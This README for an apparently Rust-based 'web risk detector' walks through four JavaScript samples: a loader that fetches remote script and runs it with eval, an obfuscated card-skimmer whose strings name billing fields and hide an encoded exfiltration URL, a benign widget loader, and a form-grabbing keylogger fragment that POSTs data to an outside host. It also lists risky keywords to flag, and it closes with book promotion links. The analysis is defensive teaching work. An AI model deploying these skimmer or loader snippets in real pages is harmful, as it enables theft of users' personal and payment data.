# web_risk_detector
Web risk detector


# Detections

## Introduction.

Few decades ago End Users had full control on what JavaScript could do on their computers.
All they had to do was to disable or enable JavaScript on their web browsers.
Most new web browsers no longer have that option any more.
The decision to remove those options is obvious, most new web pages simply can't work properly without JavaScript. From web security point of view, JavaScript is one of those things that you can't live with it and you can't live without it. In the beginning, it was very simply to get the JavaScript that you want only. The users had to visit that web page in a safe environment and get what they want only. The world wide web is no longer a safe environment as it used to be. It is full of risk and tricks. Things like the man in the middle attacks, spoofing attacks, DOS (Denial Of Service) attacks, etc.


## File 1: (eval usage example)

It starts with 4 global variables.
par, i, o and u.
It assigns values to the global variables taken from the web page
document list.
Starting from document.scripts.length - 2.
The text is assigned to par.
It replaces comment tags <!-- with '' and --> with ''.
It splits the text at '-' and assigns this list to par.
It assigns the first 3 values to i, o, u. index0 to i, index1 to o and index2 to u.

It uses function zdRndNum(n) to generate random values.
It uses function isIE() to check if the browsers is Internet Explorer.

var zdrandomnum = zdRndNum(10);
Generates ten random numbers and concanates them and assigns to
zdrandomnum variable.

If u has a value it create a url link with i,o,u and zdrandomnum values.

If u doesn't have a value it create a url link with i,o and zdrandomnum values only.

It assigns this link to var url.

var isie = isIE();
It checks if the browser is IE.
If it is it write the script from the link to the web page.
var xhr = new XMLHttpRequest();
If the browser is not IE, it get the new script using XMLHttpRequest from url link.

```

var text = XMLHttpReq.responseText;
if(window.execScript) {
window.execScript(text);
} else {
window.eval(text);
}

```

It uses execScript or eval to run text it received from the url link.

```

xhr.send(null);

```

null means null in any language.
It send null.

Comments:
Users should be cautious when executing scripts from external url.
They could be security risks.
They could execute harmful actions.

## File 2: (obfuscated example)

File 2 is obfuscated.
To deobfuscate this file could be time consuming.
Obfuscated file is hard to read in the first place.
There is always a light at the end of the tunnel.
JavaScript obfuscated file is written for the web browser to read it, and still work as the original file.

So we must read this file as the browser would.
The first thing we look for words that the browser could understand. Here we are looking for key words that the browser could not perform the intended action if changed. In web security we are concerned with actions that have high risk. So we look for those key words that could course potential harm. We check the code line by line. If the line contains one or more of those key words we note down the line number, we raise the flag, we scrutinize that line. We make a comment why we raise the flag.

The key words that could help us try to make sense of the obfuscated JavaScript file includes the following: var, let, function, fetch,  XMLHttpRequest, eval, execScript, localStorage, etc. We could also check if it uses encoded names like hexadecimal or it if uses functions to encode and decode data like atoi, atof, atol, atob, btoa, parseInt, etc.

Binary crate detector/src/main.rs and Library crate javascript/src/lib.rs in the web_risk_detector folder do just that.
In a sense we are building the AI Model here, that could detect
web risk in JavaScript, analyze the script and help us try to make sense of it.

Comments:

It uses encoded function names and variable names.
It manipulate characters and encoded data structures.
It collects user input. It sends data to the server.

It uses localStorage:

```

window[_0x47edb5(0xd4)][_0x47edb5(0xdd)](xfkwf[_0x47edb5(0xdf)],_0x3ac81b);},xfkwf[_0x4d5ab1(0x115)]=function(){var _0x31ecae=_0x4d5ab1,_0x5b484b=window['localStorage'][_0x31ecae(0xdc)](xfkwf[_0x31ecae(0xdf)]);

```

It uses fetch:

```

"_0x48fd7e[_0x4dcc4c(0x124)](xfkwf['vnskp_param'],_0x1cdb15),fetch(xfkwf[_0x4dcc4c(0x116)](xfkwf[_0x4dcc4c(0x10b)])+'?'+Math[_0x4dcc4c(0xdb)](),{'method':_0x4dcc4c(0xd7),
'body':_0x48fd7e});"

```

It uses atob:

```

},xfkwf[_0x4d5ab1(0x116)]=function(_0x1fdc44){
    var_0x47fb3d=_0x4d5ab1,_0x53193b=atob(_0x1fdc44),_0x4bd8d1='';

```

It uses btoa:

```

return btoa(encodeURIComponent(_0x59e75c)[_0x3510bf(0x107)]
(/%([0-9A-F]{2})/g,function(_0x5c6ecd,_0x36bb0a){
    var _0xaebe5=_0x3510bf;

```

As you can see the main purpose of obfuscated file is to make it unreadable for users. But some lines could give us a clue of what is happening here.

For example this line:

```

function _0x4720(){var _0x3ddb09=['vnskp_type','34472647ZfYNqD','yxkxl','toString','innerText','rkrhv','phone','wwtlq','45XOedQO','lqbjn','length','default_billing','selectedOptions','parse','region','34ctScIO','mepgq','forEach','Holder','vnskp','scnhm','16ZjpFvE','object','bmmuw','blfoi','country','3986424sIJGeN','value','city','JSON','570264RcISWA','qwyjy','replace','101221cMBWHB','slice','firstname','liluj','country_id','13699150SOIvNk','awcsb','4994892xjGFUw','getElementsByTagName','Domain','IMG','fromCharCode','addresses','yqgnj','wsmlv','undefined','12246bODdzt','setInterval','wyhyj','select','ycsnm','12gmYQLy','createElement','stringify','state','textarea','input','querySelector','append','indexOf','lytgk','zip','lastname','push','localStorage','zytth','vnskp_param','POST','vqmub','sfofx','hasAttribute','random','getItem','setItem','trim','nsvus','janyb','836bnvckL','street','postcode','attributes','src','aHR0cHM6Ly9jZG4tcmVwb3J0LmNvbS9zdGF0dXMv'];

```

## File 3: (clean file example)

Comments:
Like with the other files we can also break it down and look
for possibly clues.

For example these lines could be of great help:

```

var p=function(e){
  var t=document.createElement("script");
  return t.type="text/javascript",t.charset="utf-8",t.src=e,t
},
l=n(76141).public_path,f=l+"frame.7a3ddac5.js",
w=l+"vendor.e163e343.js",h=l+"frame-modern.78abb9d0.js",
v=l+"vendor-modern.dde03d24.js",
g="MySite",
b=/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit/i,
y=function(){
    return window[g]&&window[g].booted
},
S=function(){
var e,
t=!!(
e=navigator.userAgent.match(/Chrom(?:e|ium)\/([0-9\.]+)/)
)&&e[1];
return!!t&&t.split(".").map((function(e){
return parseInt(e)}))},
A=function(){
var e=document.querySelector('meta[name="referrer"]'),
t=e?'<meta name="referrer" content="'+e.content+'">':"",
n=document.createElement("iframe");
n.id="mysite-frame",n.setAttribute(
"style","position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;"
),
o()&&n.setAttribute("style",
n.getAttribute("style")+"visibility: hidden;"),
n.setAttribute("aria-hidden","true"),
n.setAttribute("tabIndex","-1"),
n.setAttribute("title","MySite"),
document.body.appendChild(n),
function(e,t,n){
    if(void 0===n&&(n="en"),c.isFirefox()){
        var r=e.contentDocument.open();
        r.write("<!DOCTYPE html>"),
        r.close()
    }
    !function(e,t,n){
    void 0===n&&(n="en"),
    e.documentElement.innerHTML=t,
    e.documentElement.setAttribute("lang",n)
    }
    (e.contentDocument,t,n)
}(n,'<!DOCTYPE html>\n <html lang="en">\n <head>\n '+t+"\n </head>\n <body>\n </body>\n </html>");

```

It creates and manage iframe.
It checks for browser capabilities.
e.g. XMLHttpRequest, hasLocalStorageSupport, isMobileBrowser, isIOS, isChrome, etc.
It adds additional contents from MySite.
It also defines modules that exports a configuration object with several properties e.g. API URLs and paths.


```
"attachEvent"in window&&!window.addEventListener||navigator&&navigator.userAgent&&/MSIE 9\.0/.test(navigator.userAgent)&&window.addEventListener&&!window.atob||"onp
ropertychange"in document&&window.matchMedia&&/MSIE 10\.0/.test(navigator.userAgent)||navigator&&navigator.userAgent&&b.test(navigator.userAgent)||window.isMySiteMessengerSheet||y()||(E(),function(e,t,n){m.forEach((function(t){document.addEventListener(t,e)})),u.forEach((function(e){document.addEventListener(e,t)})),d.forEach((function(e){document.addEventListener(e,n)}))}(E,x,(function(){window[g]("shutdown",!1),delete window[g],x(),_()})))}()}();


```


## File 4: (keylogger example)

This one is easy and straightforward.
We can also break it down and read it line by line.

```

(function () {
console.log("Analytics loaded!");
const externURL = "https://something.refreshment.ltd/send";
const externURLKeys = "https://something.refreshment.ltd/keys";
// Helper function to send data
function sendData(data, url) {
const xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
//...
//..etc...
//.........
document.addEventListener("submit", function (e) {
e.preventDefault();
const formData = collectFormData();
sendData(formData, externURL);
});
})();

```

It uses the anonymous function to run the script as soon as it is loaded.

It tracks users interaction with the web page.
It records users key strokes and send them to the external link.
It prevents the default browser settings.

```
xhr.send(JSON.stringify(data));

```

This is within the anonymous function.
The other file was sending null, but this one is sending something to the server.


Comments:
There is something fishy about this code.
Tracking users input without their concerns doesn't sound right.
If that is not enough, it disables default settings.
That is also not right.
It raises the security risk flag.



Buildig AI Models with Rust.

For more on this one please see the following links:

## Shumidixioc
1.
Building AI models with Rust, volume 1 : Web risk detector.

    https://payhip.com/shumidixioc


## More
2.

https://www.amazon.com/AI-Agent-Africa-Faith-Engineering-ebook/dp/B0DPDMD2TV



3.
AI Agent in Africa, Volume 2: Explore ML with DIY Projects.
    Link: Coming up soon.
